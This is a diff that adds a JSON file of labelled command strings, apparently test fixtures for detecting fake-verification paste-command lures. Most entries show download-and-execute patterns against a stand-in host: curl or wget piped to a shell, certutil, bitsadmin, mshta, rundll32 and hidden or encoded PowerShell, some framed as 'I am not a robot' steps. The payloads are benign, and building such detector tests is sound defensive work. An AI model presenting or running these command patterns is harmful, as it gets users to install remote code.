@@ -1,0 +1,94 @@
+[
+  {
+    "category": "base64-long",
+    "text": "bitsadmin /transfer task DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD C:\\Temp\\x && echo ok"
+  },
+  {
+    "category": "base64-long",
+    "text": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA && echo done"
+  },
+  {
+    "category": "bitsadmin",
+    "text": "bitsadmin.exe /transfer check https://example.invalid/check C:\\Temp\\check.bin & calc"
+  },
+  {
+    "category": "bitsadmin",
+    "text": "bitsadmin\t/transfer\tjob\thttps://example.invalid/file C:\\Temp\\file && calc"
+  },
+  {
+    "category": "certutil",
+    "text": "certutil -urlcache -f https://example.invalid/a C:\\Temp\\a && echo done"
+  },
+  {
+    "category": "certutil",
+    "text": "Verification ID 4821: certutil -urlcache -f https://example.invalid/x file.bin && calc"
+  },
+  {
+    "category": "cmd-chain",
+    "text": "I am not a robot - verification ID: cmd /c echo ready && calc"
+  },
+  {
+    "category": "cmd-chain",
+    "text": "cmd\n/c\necho checked && calc"
+  },
+  {
+    "category": "cmd-chain",
+    "text": "cmd /c \"echo verify & calc\""
+  },
+  {
+    "category": "curl-pipe",
+    "text": "curl\t-fsSL\thttps://example.invalid/a\t|\tsh && echo ok"
+  },
+  {
+    "category": "curl-pipe",
+    "text": "wget -qO- https://example.invalid/verify | bash; echo complete"
+  },
+  {
+    "category": "mshta",
+    "text": "mshta.exe javascript:echo('ok')"
+  },
+  {
+    "category": "mshta",
+    "text": "mshta https://example.invalid/a.hta & echo done"
+  },
+  {
+    "category": "multiline-and-spaces",
+    "text": "  powershell   -w   hidden   -Command   \"echo done\"  "
+  },
+  {
+    "category": "multiline-and-spaces",
+    "text": "curl  -fsSL  https://example.invalid/run  |  bash  &&  echo done"
+  },
+  {
+    "category": "powershell-download-or-iex",
+    "text": "powershell -Command \"echo one; echo two\""
+  },
+  {
+    "category": "powershell-download-or-iex",
+    "text": "powershell -Command \"iex 'echo ok'\""
+  },
+  {
+    "category": "powershell-download-or-iex",
+    "text": "pwsh.exe -windowstyle hidden -Command \"echo ok\""
+  },
+  {
+    "category": "powershell-encoded",
+    "text": "powershell -e ZQBjAGgAbwAgAG8AawA= # echo ok"
+  },
+  {
+    "category": "powershell-encoded",
+    "text": "powershell\n-enc\nZQBjAGgAbwAgAG8AawA="
+  },
+  {
+    "category": "powershell-encoded",
+    "text": "powershell.exe -EncodedCommand ZQBjAGgAbwAgAGMAYQBsAGMA"
+  },
+  {
+    "category": "utility-mix",
+    "text": "bash.exe -c 'echo checked; echo done'"
+  },
+  {
+    "category": "utility-mix",
+    "text": "rundll32 https://example.invalid/demo.dll,EntryPoint & calc"
+  }
+]
